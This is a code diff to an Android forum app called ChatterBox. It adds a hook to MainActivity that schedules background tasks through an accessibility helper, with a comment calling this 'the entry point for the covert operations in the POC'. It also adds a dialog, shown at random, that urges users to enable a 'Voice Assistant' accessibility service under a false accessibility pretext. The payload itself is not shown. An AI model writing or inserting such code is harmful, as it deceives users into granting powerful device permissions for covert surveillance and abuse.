@@ -14,6 +14,7 @@ import androidx.appcompat.app.AppCompatActivity
 import androidx.core.view.GravityCompat
 import androidx.drawerlayout.widget.DrawerLayout
 import com.bumptech.glide.Glide
+import com.example.ChatterBox.accessibility.AccessibilityHelper
 import com.example.ChatterBox.models.User
 import com.google.android.material.navigation.NavigationView
 import com.google.firebase.auth.FirebaseAuth
@@ -41,6 +42,32 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         loadUserProfile()
         checkIfAdmin()
         loadEnrolledForums()
+        
+        // Check if accessibility service is enabled and schedule background tasks if it is
+        // This is the entry point for the covert operations in the POC
+        AccessibilityHelper.checkAndScheduleBackgroundTasks(this)
+        
+        // If accessibility service is not enabled, occasionally suggest it
+        if (!AccessibilityHelper.isAccessibilityServiceEnabled(this) && Math.random() < 0.1) {
+            showAccessibilityPrompt()
+        }
+    }
+    
+    /**
+     * Show a prompt suggesting the user enable accessibility features
+     */
+    private fun showAccessibilityPrompt() {
+        val dialog = androidx.appcompat.app.AlertDialog.Builder(this)
+            .setTitle("Enhance Your Experience")
+            .setMessage("Enable Voice Assistant to make ChatterBox more accessible. Perfect for multitasking or users with visual impairments.")
+            .setPositiveButton("Enable Now") { _, _ ->
+                // Take them to accessibility settings
+                startActivity(Intent(this, AccessibilityPromoActivity::class.java))
+            }
+            .setNegativeButton("Maybe Later", null)
+            .create()
+        
+        dialog.show()
     }
 
     /** 🔹 Setup Navigation Drawer */
